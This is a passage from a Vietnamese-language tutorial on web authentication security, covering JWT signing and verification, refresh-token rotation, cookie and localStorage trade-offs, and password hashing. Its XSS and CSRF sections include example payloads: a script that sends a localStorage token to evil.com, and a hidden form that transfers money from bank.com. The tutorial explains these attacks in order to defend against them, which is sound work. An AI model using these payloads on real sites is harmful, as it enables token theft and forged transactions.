const token = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NSIsInJvbGUiOiJhZG1pbiJ9.xxx';
const payload = JSON.parse(atob(token.split('.')[1]));
console.log(payload); // → { sub: "12345", role: "admin" } ← ai cũng thấy
```

**Tóm lại:**
- Không được lưu: mật khẩu, số thẻ tín dụng, số CMND/CCCD, bất kỳ dữ liệu cá nhân nhạy cảm nào
- Chỉ nên lưu: mã người dùng (`sub`), vai trò, quyền hạn, thời hạn
- Nếu thực sự cần mã hoá nội dung → phải dùng **JWE**, nhưng rất hiếm khi cần

---

## Quá trình xác minh JWT — Server làm gì khi nhận token?

```
Client gửi: Authorization: Bearer <token>
                                     ↓
                         Server nhận token
                                     ↓
                 ┌─── BƯỚC 1: Kiểm tra cấu trúc (Validation) ──┐
                 │ - Có đúng 3 phần không?                      │
                 │ - Base64URL giải mã được không?               │
                 │ - Header có chứa thuật toán hợp lệ không?    │
                 └──────────────────┬────────────────────────────┘
                                   ↓
                 ┌─── BƯỚC 2: Xác minh chữ ký (Verification) ──┐
                 │ - Lấy khoá (secret hoặc public key)          │
                 │ - Tính lại chữ ký từ header + payload        │
                 │ - So sánh với chữ ký trong token             │
                 │ - Khớp → token chưa bị sửa. Không khớp → BỎ │
                 └──────────────────┬────────────────────────────┘
                                   ↓
                 ┌─── BƯỚC 3: Kiểm tra Claims ──────────────────┐
                 │ - exp: đã hết hạn chưa?                      │
                 │ - nbf: đã đến thời điểm cho phép chưa?       │
                 │ - iss: đúng người cấp không?                  │
                 │ - aud: đúng đối tượng không?                  │
                 └──────────────────┬────────────────────────────┘
                                   ↓
                        Token hợp lệ → Cho phép truy cập
```

> **Phỏng vấn hay hỏi:** "Validate và Verify JWT khác gì nhau?" → **Validate** = kiểm tra **cấu trúc** (đúng format, claims hợp lệ). **Verify** = kiểm tra **chữ ký** (đảm bảo token chưa bị sửa và đến từ nguồn đáng tin cậy).

---

# 6. Thuật toán ký — Đối xứng và Bất đối xứng

## Bảng so sánh

| | HS256 (Đối xứng) | RS256 (Bất đối xứng) |
|---|---|---|
| **Cơ chế** | 1 khoá duy nhất — vừa ký vừa xác minh | 2 khoá — khoá riêng để ký, khoá công khai để xác minh |
| **Thuật toán** | HMAC-SHA256 | RSA-SHA256 |
| **Ai giữ khoá** | Tất cả server đều phải biết cùng một secret | Chỉ dịch vụ xác thực giữ khoá riêng. Các dịch vụ khác giữ khoá công khai |
| **Rủi ro** | Lộ khoá = ai cũng tạo được token giả | Lộ khoá công khai → không sao (chỉ xác minh, không tạo được token) |
| **Hiệu suất** | Nhanh hơn | Chậm hơn (RSA tốn CPU hơn) |
| **Phù hợp** | Hệ thống đơn, 1 server | **Microservices**, nhiều dịch vụ, API công khai |

### HS256 — Khoá đối xứng (1 khoá duy nhất)

```
┌─────────────────────────────────────────────────┐
│                  1 Khoá duy nhất                │
│              (secret = "my-secret")              │
└────────────────────┬────────────────────────────┘
                     │
        ┌────────────┴────────────┐
        ▼                        ▼
   ┌─────────┐              ┌─────────┐
   │ Server  │              │ Server  │
   │ (ký)    │              │ (xác    │
   │         │              │  minh)  │
   └─────────┘              └─────────┘
   Dùng CÙNG khoá          Dùng CÙNG khoá
```

```typescript
// NestJS — HS256 (đơn giản, 1 server)
JwtModule.register({
  secret: 'my-super-secret-key',   // ← 1 khoá duy nhất
  signOptions: { algorithm: 'HS256', expiresIn: '15m' },
})
```

**Vấn đề:** Nếu bạn có 5 microservices, cả 5 đều phải biết `secret`. Bất kỳ dịch vụ nào bị tấn công → kẻ tấn công tạo được JWT giả hợp lệ.

### RS256 — Cặp khoá bất đối xứng

```
┌──────────────────┐                 ┌──────────────────┐
│  Dịch vụ xác thực│                 │  Các dịch vụ     │
│  (DUY NHẤT       │                 │  khác (API,      │
│  tạo token)      │                 │  Gateway, v.v.)  │
│                  │                 │                  │
│  Giữ: KHOÁ RIÊNG│    phân phát    │  Giữ: KHOÁ      │
│              🔒  │───────────────►│  CÔNG KHAI   🔓  │
│                  │   khoá công     │                  │
│  Ký token: được  │   khai          │  Xác minh: được  │
│  Xác minh: được  │                 │  Tạo token: KHÔNG│
└──────────────────┘                 └──────────────────┘
```

**Nguyên lý cặp khoá:**
- **Khoá riêng (private key)** — dùng để **ký** token. Chỉ dịch vụ xác thực giữ, tuyệt đối không chia sẻ.
- **Khoá công khai (public key)** — dùng để **xác minh** chữ ký. Phân phát cho tất cả dịch vụ — ai có cũng được, vì **không thể tạo token** chỉ từ khoá công khai.

```typescript
// NestJS — RS256 (microservices)
import { readFileSync } from 'fs';

// Dịch vụ xác thực — NƠI DUY NHẤT tạo token
JwtModule.register({
  privateKey: readFileSync('private.pem'),  // ← khoá riêng, chỉ dịch vụ xác thực có
  signOptions: { algorithm: 'RS256', expiresIn: '15m' },
})

// Các dịch vụ khác — CHỈ xác minh, KHÔNG tạo token
JwtModule.register({
  publicKey: readFileSync('public.pem'),    // ← khoá công khai, ai có cũng được
  verifyOptions: { algorithms: ['RS256'] },
})
```

```bash
# Tạo cặp khoá RSA — chạy 1 lần
openssl genrsa -out private.pem 2048                       # Tạo khoá riêng
openssl rsa -in private.pem -pubout -out public.pem         # Rút khoá công khai từ khoá riêng
```

### ES256 — Bất đối xứng, nhỏ gọn hơn RS256

| | RS256 | ES256 |
|---|---|---|
| **Thuật toán** | RSA-SHA256 | ECDSA-SHA256 (đường cong Elliptic) |
| **Kích thước chữ ký** | ~342 bytes | ~86 bytes (nhỏ hơn 4 lần) |
| **Hiệu suất** | Ký chậm, xác minh nhanh | Ký nhanh hơn, xác minh tương đương |
| **An toàn** | 2048-bit RSA tương đương 256-bit ECDSA | Cùng mức an toàn, khoá nhỏ hơn nhiều |
| **Dùng khi** | Phổ biến nhất cho microservices | Khi cần token nhỏ gọn (di động, IoT) |

---

# 7. Access Token và Refresh Token

## Tại sao cần 2 token?

**Bài toán:** Nếu đặt thời hạn access token ngắn (15 phút) → người dùng phải đăng nhập lại liên tục. Nếu đặt dài (30 ngày) → kẻ tấn công đánh cắp được token thì dùng rất lâu.

**Lời giải:** Dùng 2 loại token với mục đích khác nhau:

| | Access Token | Refresh Token |
|---|---|---|
| **Mục đích** | Truy cập tài nguyên (gọi API) | Dùng để xin cấp access token mới |
| **Thời hạn** | Ngắn (5–30 phút) | Dài (7–30 ngày) |
| **Lưu ở đâu** | Bộ nhớ JS / httpOnly cookie | httpOnly cookie (Secure, SameSite) |
| **Gửi đi khi** | Mỗi yêu cầu tới API | Chỉ khi access token hết hạn |
| **Nếu bị lộ** | Rủi ro thấp (hết hạn nhanh) | Rủi ro cao → phải dùng rotation |

## Luồng hoạt động

```
1. ĐĂNG NHẬP
   Client ──► POST /auth/login { email, password }
   Server ──► Xác minh → Tạo Access Token (15 phút) + Refresh Token (7 ngày)
   Server ──► Lưu Refresh Token vào DB (đã băm)
   (Tại sao phải băm? Nếu DB bị xâm nhập, kẻ tấn công không lấy được token gốc để dùng)
   Server ──► Trả cả 2 token cho client

2. GỌI API
   Client ──► GET /api/data + Authorization: Bearer <access_token>
   Server ──► Xác minh access token → 200 OK

3. ACCESS TOKEN HẾT HẠN
   Client ──► GET /api/data + Authorization: Bearer <token_hết_hạn>
   Server ──► 401 Token đã hết hạn

4. LÀM MỚI TOKEN
   Client ──► POST /auth/refresh + { refreshToken }
   Server ──► Xác minh refresh token + tra cứu DB
   Server ──► Tạo Access Token MỚI + Refresh Token MỚI (xoay vòng)
   Server ──► Huỷ refresh token cũ trong DB
   Server ──► Trả 2 token mới

5. ĐĂNG XUẤT
   Client ──► POST /auth/logout + { refreshToken }
   Server ──► Xoá refresh token khỏi DB
   Server ──► Access token cũ vẫn hợp lệ trong thời gian còn lại
              (xem phần "Thu hồi Access Token" bên dưới)
```

### Thu hồi Access Token khi đăng xuất

Vì JWT không có trạng thái (stateless), server không thể "vô hiệu hoá" một access token đã cấp. Có 3 cách xử lý:

| Cách | Cơ chế | Đánh đổi |
|---|---|---|
| **1. Thời hạn ngắn** | Access token chỉ sống 5–15 phút → chấp nhận rủi ro nhỏ | Đơn giản, giữ nguyên tính stateless. Nhưng token vẫn dùng được trong 5–15 phút |
| **2. Danh sách đen (Redis)** | Lưu mã định danh `jti` của token đã đăng xuất vào Redis. Mỗi yêu cầu phải kiểm tra danh sách đen | Thu hồi ngay lập tức. Nhưng mất tính stateless, phải tra Redis mỗi yêu cầu |
| **3. Phiên bản token trong DB** | Mỗi người dùng có trường `tokenVersion`. Khi đăng xuất → tăng phiên bản. Lúc xác minh JWT, kiểm tra phiên bản có khớp không | Thu hồi tất cả token cùng lúc. Nhưng phải truy vấn DB mỗi yêu cầu |

```typescript
// Cách 2: Danh sách đen bằng Redis
async dangXuat(token: string) {
  const payload = this.jwtService.decode(token);
  const thoiGianConLai = payload.exp - Math.floor(Date.now() / 1000);
  // Chỉ cần lưu trong danh sách đen cho đến khi token hết hạn → sau đó tự xoá
  await this.redis.set(`blacklist:${payload.jti}`, '1', 'EX', thoiGianConLai);
}

async xacMinhToken(token: string) {
  const payload = this.jwtService.verify(token);
  const daBiThuHoi = await this.redis.get(`blacklist:${payload.jti}`);
  if (daBiThuHoi) throw new UnauthorizedException('Token đã bị thu hồi');
  return payload;
}
```

## Xoay vòng Refresh Token (Refresh Token Rotation)

**Nguyên tắc:** Mỗi lần dùng refresh token → cấp refresh token mới, huỷ cái cũ.

**Tại sao phải làm vậy?** Giả sử kẻ tấn công đánh cắp được refresh token:

1. Kẻ tấn công dùng refresh token → nhận được cặp token mới → refresh token cũ bị huỷ
2. Người dùng thật dùng refresh token cũ (đã bị huỷ) → **Server phát hiện tái sử dụng** → thu hồi TẤT CẢ token của người dùng đó
3. Người dùng buộc phải đăng nhập lại → kẻ tấn công cũng mất quyền

```javascript
// Phát hiện tái sử dụng Refresh Token
async lamMoiToken(token) {
  const payload = this.jwtService.decode(token); // Giải mã để lấy userId
  const tokenTrongDB = await db.refreshToken.findUnique({
    where: { token: hash(token) }
  });

  if (!tokenTrongDB) {
    // Token không tồn tại → có thể đã bị xoay vòng → PHÁT HIỆN TÁI SỬ DỤNG
    // Thu hồi TẤT CẢ refresh token của người dùng (biện pháp an toàn)
    await db.refreshToken.deleteMany({ where: { userId: payload.sub } });
    throw new UnauthorizedException('Phát hiện hoạt động đáng ngờ');
  }

  // Token hợp lệ → xoay vòng: xoá cũ, tạo mới
  await db.refreshToken.delete({ where: { id: tokenTrongDB.id } });

  const accessTokenMoi = this.jwtService.sign({ sub: tokenTrongDB.userId });
  const refreshTokenMoi = crypto.randomUUID();
  await db.refreshToken.create({
    data: { token: hash(refreshTokenMoi), userId: tokenTrongDB.userId }
  });

  return { accessToken: accessTokenMoi, refreshToken: refreshTokenMoi };
}
```

---

# 8. Nơi lưu trữ phía trình duyệt — Cookie, localStorage, sessionStorage

Đây là phần rất quan trọng và hay bị hỏi phỏng vấn. Cần hiểu rõ bản chất từng loại lưu trữ, ưu nhược điểm, và tại sao nên dùng httpOnly cookie cho token.

## Cookie

### Bản chất

Cookie là những **mảnh dữ liệu nhỏ** do server gửi về, trình duyệt **tự động lưu** và **tự động gửi kèm** theo mọi yêu cầu đến cùng tên miền đó.

### Đặc điểm

| Đặc điểm | Chi tiết |
|---|---|
| **Dung lượng** | Tối đa khoảng 4KB mỗi cookie |
| **Tự động gửi** | Trình duyệt tự gắn cookie vào mọi yêu cầu HTTP đến tên miền tương ứng — không cần viết mã JS |
| **Phạm vi** | Theo tên miền và đường dẫn (path) |
| **Thời hạn** | Có thể đặt thời hạn (Expires/Max-Age). Nếu không đặt → cookie phiên (mất khi đóng trình duyệt) |
| **Truy cập từ JS** | Mặc định đọc được bằng `document.cookie`. Trừ khi đặt cờ `HttpOnly` |
| **Gửi kèm yêu cầu** | Tự động, không cần lập trình viên xử lý |

### Các cờ bảo mật quan trọng của Cookie

| Cờ | Tác dụng | Ví dụ |
|---|---|---|
| **HttpOnly** | Cấm JavaScript truy cập cookie → chống XSS | Mã JS độc không thể dùng `document.cookie` để đọc token |
| **Secure** | Chỉ gửi cookie qua kết nối HTTPS (mã hoá) | Chống nghe lén trên mạng công cộng |
| **SameSite=Strict** | Chỉ gửi cookie khi yêu cầu xuất phát từ cùng tên miền | Chống CSRF — trang khác không thể lợi dụng cookie của bạn |
| **SameSite=Lax** | Gửi cookie với yêu cầu điều hướng cấp cao nhất (bấm link), nhưng không gửi với yêu cầu AJAX từ tên miền khác | Cân bằng giữa bảo mật và tiện dùng |
| **Domain** | Xác định cookie gửi cho những tên miền nào | `Domain=.example.com` → gửi cho cả `api.example.com` |
| **Path** | Xác định cookie gửi cho những đường dẫn nào | `Path=/api` → chỉ gửi khi truy cập `/api/*` |
| **Max-Age / Expires** | Thời gian sống của cookie | `Max-Age=604800` → 7 ngày |

```
Ví dụ header Set-Cookie đầy đủ:

Set-Cookie: refreshToken=abc123;
            HttpOnly;           ← JS không đọc được
            Secure;             ← Chỉ gửi qua HTTPS
            SameSite=Strict;    ← Chỉ gửi cùng tên miền
            Path=/api/auth;     ← Chỉ gửi khi gọi /api/auth
            Max-Age=604800      ← Sống 7 ngày
```

---

## HttpOnly Cookie — Tại sao lưu token vào đây?

### HttpOnly Cookie là gì?

HttpOnly cookie là cookie có gắn cờ **`HttpOnly`**. Cờ này ra lệnh cho trình duyệt: **cấm JavaScript truy cập cookie này**. Cookie chỉ được gửi qua HTTP/HTTPS, mã JavaScript (kể cả `document.cookie`) hoàn toàn không nhìn thấy, không đọc được, không sửa được.

### Tại sao phải dùng HttpOnly cookie thay vì localStorage/sessionStorage?

Lý do cốt lõi: **chống tấn công XSS (Cross-Site Scripting)**.

**XSS là gì?** Là khi kẻ tấn công chèn được mã JavaScript độc vào trang web của bạn (qua ô bình luận, ô tìm kiếm, hoặc thư viện bên thứ ba bị nhiễm mã độc). Mã JS độc này chạy trên trình duyệt của người dùng, **với toàn quyền truy cập** vào mọi thứ mà JS bình thường truy cập được.

```
Tình huống tấn công XSS:

1. Kẻ tấn công chèn mã JS độc vào trang web (qua bình luận, quảng cáo...)

2. Nếu token lưu trong localStorage:
   Mã độc: const token = localStorage.getItem('accessToken');
           fetch('https://server-ke-tan-cong.com/steal?token=' + token);
   → Token bị đánh cắp → Kẻ tấn công dùng token gọi API giả mạo người dùng

3. Nếu token lưu trong httpOnly cookie:
   Mã độc: document.cookie  → KHÔNG thấy gì (cờ HttpOnly chặn)
           localStorage.getItem('token')  → không có gì ở đây
   → Kẻ tấn công KHÔNG LẤY ĐƯỢC token
   → Dù mã độc gửi yêu cầu đến API, cookie vẫn được gửi kèm
      nhưng kẻ tấn công KHÔNG THỂ ĐỌC hay GỬI token đến server của mình
```

### Tại sao không chỉ dùng cookie thường (không có HttpOnly)?

Cookie thường (không có cờ HttpOnly) vẫn bị JavaScript đọc được qua `document.cookie`. Vậy thì không khác gì localStorage về mặt bảo mật trước XSS.

### HttpOnly cookie có hoàn hảo không?

Không. HttpOnly cookie vẫn có nhược điểm:

| Vấn đề | Giải thích | Cách khắc phục |
|---|---|---|
| **Tấn công CSRF** | Cookie tự động gửi kèm yêu cầu → trang web độc có thể tạo yêu cầu giả mạo | Dùng cờ `SameSite=Strict` hoặc `SameSite=Lax`, kết hợp CSRF token |
| **Không linh hoạt** | Cookie gắn liền với tên miền → khó dùng khi API và trang web ở tên miền khác | Cấu hình CORS và `Domain` phù hợp |
| **JS không đọc được** | Đôi khi phía giao diện cần biết token (ví dụ kiểm tra hết hạn) | Lưu access token trong biến JS (bộ nhớ), chỉ lưu refresh token trong httpOnly cookie |

---

## localStorage

### Bản chất

localStorage là vùng lưu trữ **trên trình duyệt**, cho phép JavaScript lưu dữ liệu dưới dạng cặp khoá-giá trị. Dữ liệu **tồn tại vĩnh viễn** (cho đến khi bị xoá bằng mã JS hoặc người dùng xoá thủ công).

### Đặc điểm

| Đặc điểm | Chi tiết |
|---|---|
| **Dung lượng** | Khoảng 5–10MB (tuỳ trình duyệt) |
| **Thời gian sống** | **Vĩnh viễn** — không tự hết hạn, tồn tại sau khi đóng trình duyệt, đóng tab |
| **Phạm vi** | Theo tên miền (origin = giao thức + tên miền + cổng) |
| **Truy cập từ JS** | Đọc/ghi thoải mái bằng `localStorage.getItem()` / `localStorage.setItem()` |
| **Gửi kèm yêu cầu** | **KHÔNG tự động gửi** — lập trình viên phải tự đính kèm vào header |
| **Kiểu dữ liệu** | Chỉ lưu được chuỗi (string). Lưu đối tượng phải dùng `JSON.stringify()` |

```javascript
// Lưu
localStorage.setItem('theme', 'dark');

// Đọc
const theme = localStorage.getItem('theme'); // → "dark"

// Xoá 1 mục
localStorage.removeItem('theme');

// Xoá toàn bộ
localStorage.clear();
```

### Có nên lưu token trong localStorage?

**Không nên.** Vì bất kỳ mã JavaScript nào chạy trên trang cũng đọc được localStorage → dễ bị tấn công XSS đánh cắp token.

**Nên dùng localStorage cho:** Dữ liệu không nhạy cảm — tuỳ chọn giao diện (sáng/tối), ngôn ngữ, giỏ hàng tạm thời.

---

## sessionStorage

### Bản chất

sessionStorage giống hệt localStorage về cách dùng, nhưng dữ liệu **chỉ tồn tại trong phiên tab hiện tại**. Đóng tab hoặc đóng trình duyệt → dữ liệu biến mất.

### Đặc điểm

| Đặc điểm | Chi tiết |
|---|---|
| **Dung lượng** | Khoảng 5–10MB (tuỳ trình duyệt) |
| **Thời gian sống** | **Chỉ trong phiên tab hiện tại** — đóng tab là mất |
| **Phạm vi** | Theo tên miền VÀ theo tab — 2 tab cùng trang web KHÔNG chia sẻ sessionStorage |
| **Truy cập từ JS** | Đọc/ghi thoải mái bằng `sessionStorage.getItem()` / `sessionStorage.setItem()` |
| **Gửi kèm yêu cầu** | **KHÔNG tự động gửi** |

```javascript
// Cú pháp giống hệt localStorage
sessionStorage.setItem('tempData', 'some value');
const data = sessionStorage.getItem('tempData');
```

### Có nên lưu token trong sessionStorage?

**Không nên.** Vẫn bị JS đọc được → vẫn dính XSS. Thêm vào đó, đóng tab là mất token → người dùng phải đăng nhập lại.

**Nên dùng sessionStorage cho:** Dữ liệu tạm thời trong phiên làm việc — bước hiện tại trong form nhiều bước, bộ lọc tìm kiếm tạm thời.

---

## Biến trong bộ nhớ JavaScript (In-memory)

### Bản chất

Lưu token trong một **biến JavaScript** bình thường (ví dụ biến trong module, state của ứng dụng, closure). Dữ liệu nằm trong bộ nhớ RAM, không lưu xuống đĩa.

### Đặc điểm

| Đặc điểm | Chi tiết |
|---|---|
| **Dung lượng** | Không giới hạn cố định (phụ thuộc RAM) |
| **Thời gian sống** | Mất khi **tải lại trang** (refresh) hoặc đóng tab |
| **JS đọc được?** | Có — nhưng khó bị đánh cắp hơn vì không có API toàn cục như localStorage |
| **Gửi kèm yêu cầu** | Không tự động — lập trình viên tự đính kèm |

**Nên dùng cho:** Access token. Khi tải lại trang → access token mất → dùng refresh token (trong httpOnly cookie) để xin cấp mới.

---

## Bảng so sánh — Dễ nhớ

```
Cookie          → Hộp quà do QUÁN gửi về     → Tự động mang theo mỗi lần đến quán
localStorage    → Tủ đồ CÁ NHÂN ở nhà        → Mở tủ lúc nào cũng được, đồ ở đó mãi
sessionStorage  → Tủ đồ GỬI TẠM ở sảnh       → Về nhà (đóng tab) là mất
Biến JS         → Cầm trên TAY               → Buông tay (tải lại trang) là rơi
```

### 1. Lưu trữ và phạm vi

| | Cookie | localStorage | sessionStorage | Biến JS |
|---|---|---|---|---|
| **Dung lượng** | ~4KB | ~5-10MB | ~5-10MB | Không giới hạn |
| **Sống bao lâu** | Tuỳ chỉnh | Vĩnh viễn | Đóng tab → mất | Tải lại trang → mất |
| **Chia sẻ giữa tab** | Có | Có | Không | Không |
| **Tự gửi theo yêu cầu** | **CÓ** (tự động) | Không | Không | Không |

### 2. Bảo mật

| | Cookie | Cookie (HttpOnly) | localStorage | sessionStorage | Biến JS |
|---|---|---|---|---|---|
| **JS đọc được?** | Có | **KHÔNG** | Có | Có | Có |
| **XSS đánh cắp được?** | Có | **KHÔNG** | Có | Có | Khó |
| **Dính CSRF?** | Có | Có | Không | Không | Không |

### 3. Nên lưu token ở đâu?

| Token | Nên lưu | Lý do |
|---|---|---|
| **Access Token** | Biến JS (bộ nhớ) | Tải lại trang → mất → dùng refresh token xin mới. Không gửi tự động → không sợ CSRF. Khó bị XSS đánh cắp |
| **Refresh Token** | HttpOnly cookie | JS không đọc được → chống XSS. Cờ SameSite chống CSRF. Cờ Secure đảm bảo chỉ gửi qua HTTPS. Tồn tại sau khi tải lại trang |
| ❌ | localStorage | Bất kỳ mã JS nào cũng đọc được → XSS đánh cắp dễ dàng |
| ❌ | sessionStorage | Vẫn bị XSS, đóng tab mất token → phải đăng nhập lại |

```
Tóm gọn để nhớ:

  Access Token  → Biến JS (bộ nhớ) hoặc httpOnly cookie
  Refresh Token → httpOnly cookie (Secure + SameSite=Strict)
  localStorage  → TUYỆT ĐỐI KHÔNG lưu token
```

---

# 9. Tấn công XSS và CSRF — Hai mối đe doạ phổ biến

Hiểu XSS và CSRF là bắt buộc để giải thích được **tại sao** lưu token ở đâu, và **tại sao** cần các cờ bảo mật trên cookie.

## XSS — Cross-Site Scripting

### Bản chất

XSS là khi kẻ tấn công **chèn được mã JavaScript độc** vào trang web của bạn. Mã này chạy trên trình duyệt của **người dùng thật**, với toàn quyền truy cập vào mọi thứ mà JavaScript bình thường truy cập được.

### Ví dụ đời thường

Giống như ai đó **lén dán một tờ giấy giả** vào bảng thông báo của công ty bạn. Nhân viên đọc thấy, tưởng thật, và làm theo — vì "nó nằm trong bảng thông báo của công ty mà".

### Cách tấn công

```
1. Kẻ tấn công tìm nơi chèn mã (ô bình luận, ô tìm kiếm, URL...)

2. Chèn mã JS độc:
   Bình luận: "Bài viết hay! <script>fetch('https://evil.com?token='+localStorage.getItem('token'))</script>"

3. Người dùng khác mở trang → trình duyệt chạy mã độc:
   - Đọc localStorage → đánh cắp token
   - Đọc document.cookie → đánh cắp cookie (nếu không có HttpOnly)
   - Gửi dữ liệu về server của kẻ tấn công
   - Thay đổi nội dung trang (lừa người dùng nhập mật khẩu...)

4. Kẻ tấn công nhận được token → giả mạo người dùng gọi API
```

### Ba dạng XSS

| Dạng | Cách hoạt động | Ví dụ |
|---|---|---|
| **Stored (Lưu trữ)** | Mã độc được **lưu vào cơ sở dữ liệu** (qua bình luận, hồ sơ...) → mọi người truy cập trang đều bị | Bình luận chứa `<script>` được lưu vào DB → hiện cho tất cả |
| **Reflected (Phản hồi)** | Mã độc nằm trong **URL** → server trả lại (phản hồi) trong trang → trình duyệt chạy | `example.com/search?q=<script>alert('hack')</script>` |
| **DOM-based** | Mã độc **không đi qua server** — JavaScript phía client tự lấy dữ liệu từ URL rồi chèn vào trang | `document.innerHTML = location.hash` → kẻ tấn công kiểm soát hash |

### Cách phòng chống

| Biện pháp | Giải thích |
|---|---|
| **Làm sạch đầu vào (Input sanitization)** | Loại bỏ hoặc mã hoá các ký tự đặc biệt (`<`, `>`, `"`, `'`) trước khi lưu hoặc hiện thị |
| **Mã hoá đầu ra (Output encoding)** | Khi hiển thị dữ liệu người dùng, chuyển `<script>` thành `&lt;script&gt;` → trình duyệt hiện chữ thay vì chạy mã |
| **Content Security Policy (CSP)** | Header HTTP ra lệnh cho trình duyệt chỉ chạy mã JS từ nguồn được phép → mã JS chèn trực tiếp bị chặn |
| **HttpOnly cookie** | Cờ HttpOnly cấm JS đọc cookie → kể cả bị XSS, kẻ tấn công không lấy được token trong cookie |
| **Không lưu token trong localStorage** | localStorage là mục tiêu đầu tiên của XSS — 1 dòng `localStorage.getItem()` là mất token |

---

## CSRF — Cross-Site Request Forgery

### Bản chất

CSRF là khi kẻ tấn công **lừa trình duyệt** của người dùng gửi yêu cầu đến server mà **người dùng không hề biết**. Kẻ tấn công lợi dụng việc trình duyệt **tự động gửi cookie** kèm theo mọi yêu cầu.

### Ví dụ đời thường

Giống như ai đó **giả mạo chữ ký** của bạn trên một tờ đơn, rồi nộp cho công ty. Công ty nhìn thấy chữ ký đúng (cookie hợp lệ), tưởng là bạn gửi, nên xử lý đơn — trong khi bạn không hề biết.

### Cách tấn công

```
1. Người dùng đăng nhập vào ngân hàng (bank.com)
   → Trình duyệt lưu cookie xác thực

2. Người dùng mở tab mới, truy cập trang web độc (evil.com)

3. Trang evil.com chứa mã ẩn:
   <img src="https://bank.com/transfer?to=hacker&amount=10000000" />
   hoặc:
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="hacker" />
     <input type="hidden" name="amount" value="10000000" />
   </form>
   <script>document.forms[0].submit()</script>

4. Trình duyệt gửi yêu cầu đến bank.com
   → TỰ ĐỘNG đính kèm cookie xác thực (vì đúng tên miền bank.com)
   → Server bank.com thấy cookie hợp lệ → xử lý giao dịch
   → Tiền bị chuyển mà người dùng không hề biết!
```

### Điểm khác biệt quan trọng: CSRF vs XSS

- **XSS**: kẻ tấn công **đọc được** dữ liệu (token, cookie) → gửi về server của mình
- **CSRF**: kẻ tấn công **không đọc được** gì → chỉ **lừa trình duyệt gửi yêu cầu** kèm cookie

### Cách phòng chống

| Biện pháp | Giải thích |
|---|---|
| **SameSite cookie** | `SameSite=Strict`: chỉ gửi cookie khi yêu cầu xuất phát từ cùng tên miền. `Lax`: gửi khi bấm link, nhưng không gửi với yêu cầu AJAX/form từ trang khác |
| **CSRF Token** | Server tạo một mã bí mật (CSRF token), gắn vào **hidden field** trong form hoặc gửi qua cookie riêng. Khi nhận yêu cầu, server so sánh giá trị CSRF token trong form/header với giá trị server đã cấp → khớp thì cho qua. Trang evil.com không biết mã này nên không thể giả mạo |
| **Kiểm tra header Origin/Referer** | Server kiểm tra yêu cầu đến từ tên miền nào. Nếu từ tên miền lạ → từ chối |
| **Không dùng cookie cho token** | Nếu token gửi qua header `Authorization` (không phải cookie) → trình duyệt không tự gửi → CSRF không hoạt động |

---

## Bảng so sánh XSS và CSRF

| | XSS | CSRF |
|---|---|---|
| **Tên đầy đủ** | Cross-Site Scripting | Cross-Site Request Forgery |
| **Bản chất** | Chèn **mã JS độc** vào trang web | Lừa trình duyệt **gửi yêu cầu giả** |
| **Kẻ tấn công làm gì** | Chạy mã trên trình duyệt nạn nhân → **đọc dữ liệu**, đánh cắp token | Lợi dụng cookie → **gửi hành động** thay nạn nhân |
| **Đọc được dữ liệu?** | **Có** — đọc localStorage, cookie (không HttpOnly), DOM | **Không** — chỉ lừa gửi yêu cầu, không đọc phản hồi |
| **Lợi dụng cái gì** | Trang web không làm sạch dữ liệu đầu vào | Cookie tự động gửi kèm mọi yêu cầu |
| **Phòng chống chính** | Làm sạch đầu vào, CSP, HttpOnly cookie | SameSite cookie, CSRF token |
| **Liên quan đến lưu token** | Là lý do **không** lưu token trong localStorage | Là lý do cần SameSite khi lưu token trong cookie |

```
Tóm gọn để nhớ:

  XSS  = Chèn mã vào trang  → ĐÁNH CẮP dữ liệu  → Chống bằng HttpOnly + làm sạch đầu vào
  CSRF = Lừa gửi yêu cầu    → HÀNH ĐỘNG giả mạo  → Chống bằng SameSite + CSRF token
```

---

# 10. Băm mật khẩu — bcrypt và argon2



## Tại sao không lưu mật khẩu dạng chữ?

Nếu cơ sở dữ liệu bị xâm nhập → kẻ tấn công có **toàn bộ mật khẩu** của người dùng. Mật khẩu phải được **băm** (hash) trước khi lưu — hàm băm là hàm một chiều, không thể đảo ngược.

> Giống như xay thịt thành pate — bạn không thể "xay ngược" từ pate ra miếng thịt ban đầu.

## Tại sao không dùng SHA-256 hay MD5 để băm mật khẩu?

SHA-256 và MD5 là các hàm băm **đa dụng** — chúng được thiết kế để **nhanh nhất có thể**. Điều này tốt cho việc kiểm tra tính toàn vẹn file, nhưng **cực kỳ tệ** cho mật khẩu:

- GPU hiện đại tính được **hàng tỷ** giá trị SHA-256 mỗi giây
- Kẻ tấn công có thể thử toàn bộ mật khẩu phổ biến trong vài phút

bcrypt và argon2 được thiết kế **cố tình chậm** → kẻ tấn công mất hàng năm thay vì vài phút.

## bcrypt — Thuật toán băm mật khẩu phổ biến nhất

```javascript
const bcrypt = require('bcrypt');

// Băm mật khẩu
const soVongLap = 12; // cost factor — càng cao càng chậm (càng an toàn)
const matKhauDaBam = await bcrypt.hash('myPassword123', soVongLap);
// → "$2b$12$LJ3m4ys3GZ...dU9K5kC.e"
//    ↑    ↑   ↑──── salt (ngẫu nhiên) ────── giá trị đã băm
//    │    └── cost factor (12)
//    └── phiên bản thuật toán (2b)

// Xác minh mật khẩu
const khop = await bcrypt.compare('myPassword123', matKhauDaBam);
// → true
```

### Các khái niệm quan trọng

| Khái niệm | Giải thích |
|---|---|
| **Salt (muối)** | Chuỗi ngẫu nhiên được thêm vào mật khẩu trước khi băm. Mỗi người dùng có salt riêng → cùng một mật khẩu nhưng cho ra giá trị băm khác nhau → chống tấn công bảng cầu vồng (rainbow table) |
| **Cost factor** | Số vòng lặp = 2^n. Ví dụ: cost = 12 thì chạy 2^12 = 4.096 vòng lặp. Tăng thêm 1 → thời gian băm **gấp đôi** |
| **Tính thích ứng** | Khi phần cứng mạnh hơn → tăng cost factor để duy trì độ an toàn. Đây là lý do bcrypt vẫn an toàn sau hơn 25 năm |

### Nên đặt cost factor bao nhiêu?

| Số vòng | Thời gian băm (xấp xỉ) | Khuyến nghị |
|---|---|---|
| 10 | ~100ms | Mức tối thiểu chấp nhận được |
| 12 | ~300ms | Nên dùng cho môi trường sản phẩm |
| 14 | ~1 giây | Rất an toàn, nhưng hơi chậm |
| 16+ | >4 giây | Quá chậm — người dùng phải chờ lâu |

## So sánh bcrypt và argon2

| | bcrypt | argon2 |
|---|---|---|
| **Ra đời** | 1999 | 2015 (chiến thắng cuộc thi Password Hashing Competition) |
